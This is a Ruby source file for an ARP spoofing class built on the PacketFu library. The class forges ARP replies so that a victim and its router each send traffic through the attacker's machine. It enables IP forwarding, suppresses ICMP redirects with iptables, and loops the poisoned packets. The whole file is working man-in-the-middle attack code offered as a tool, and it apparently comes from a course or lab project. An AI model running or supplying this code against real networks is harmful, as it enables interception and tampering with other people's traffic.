#!/usr/bin/env ruby

#-------------------------------------------------------------------------------
# arp.rb
#
# ARP Spoofing Class
#
# Author: Karl Castillo
#
# Date: October 26, 2012
#
# Functions:
# initialize - initialize the class
# start - start spoofing
# stop - stop spoofing
#
# Revisions: (Date and Description)
# 
# October 26, 2012
# Removed send and added a super class Spoof
#
# Notes:
#
#-------------------------------------------------------------------------------
require 'rubygems'
require 'packetfu'
require File.dirname(__FILE__) + '/spoof.rb'

class ARPSpoof < Spoof
    
    #---------------------------------------------------------------------------
    # initialize
    #
    # Initialization of the ARP Spoofer class.
    #
    # victim_ip - Victim's IP Address
    # victim_mac - Victim's MAC Address
    # iface - NIC Device (default = "em1")
    # spoof - true to start spoofing, false to not start (default = false)
    #
    # Revisions: (Date and Description)
    # 
    # October 26, 2012
    # Revised argument list to victim_ip, victim mac, gateway, iface, opcode
    # and spoof
    #
    # Added a spoof if statement. If spoof is true, start ARP Poisoning.
    #
    # Notes:
    #---------------------------------------------------------------------------
    def initialize(victim_ip, victim_mac, gateway, router_mac,
                   iface = "em1", 
                   spoof = false)
                   
        cfg = PacketFu::Utils.whoami?(:iface => iface) 
        
        @victim_packet = PacketFu::ARPPacket.new
        @router_packet = PacketFu::ARPPacket.new
        @iface = iface
        
        # Make the victim packet
        @victim_packet.eth_saddr = cfg[:eth_saddr]            # our MAC address
        @victim_packet.eth_daddr = victim_mac                 # the victim's MAC address
        @victim_packet.arp_saddr_mac = cfg[:eth_saddr]        # our MAC address
        @victim_packet.arp_daddr_mac = victim_mac             # the victim's MAC address
        @victim_packet.arp_saddr_ip = gateway                 # the router's IP
        @victim_packet.arp_daddr_ip = victim_ip               # the victim's IP
        @victim_packet.arp_opcode = 2                         # arp code 2 == ARP reply

        # Make the router packet
        @router_packet.eth_saddr = cfg[:eth_saddr]            # our MAC address
        @router_packet.eth_daddr = router_mac                 # the router's MAC address
        @router_packet.arp_saddr_mac = cfg[:eth_saddr]        # our MAC address
        @router_packet.arp_daddr_mac = router_mac             # the router's MAC address
        @router_packet.arp_saddr_ip = victim_ip               # the victim's IP
        @router_packet.arp_daddr_ip = gateway                 # the router's IP
        @router_packet.arp_opcode = 2                         # arp code 2 == ARP reply
        
        # Start spoofing if start is true
        if spoof then
            start
        end # if
        
    end # initialize
    
    #---------------------------------------------------------------------------
    # start
    #
    # Start ARP poisoning to the target machine
    #
    # Revisions: (Date and Description)
    #
    # October 26, 2012
    # Changed how packet is being sent from send to send(packet)
    #
    # Notes:
    #---------------------------------------------------------------------------
    def start
        puts "ARP Poisoning starting..."
        if @running then
            puts "Already running another instance of ARP Poisoning"
            return
        end
        @running = true
        
        # Enable Forwarding
        `echo 1 > /proc/sys/net/ipv4/ip_forward`
        
        # Prevent ICMP Redirect from coming out of attacker's machine
        `iptables -A OUTPUT -p ICMP --icmp-type 5 -j DROP`
        
        while(@running)
            #sleep 2
            send(@victim_packet, @iface)
            send(@router_packet, @iface)
        end # while
    end # start
    
    #---------------------------------------------------------------------------
    # stop
    #
    # Stop ARP poisoning
    #
    # Revisions: (Date and Description)
    #
    # Notes:
    #---------------------------------------------------------------------------
    def stop
        @running = false
        
        # Disable Forwarding
        `echo 0 > /proc/sys/net/ipv4/ip_forward`
        
        # Delete rule
        `iptables -D OUTPUT -p ICMP --icmp-type 5 -j DROP` 
    end # stop
end
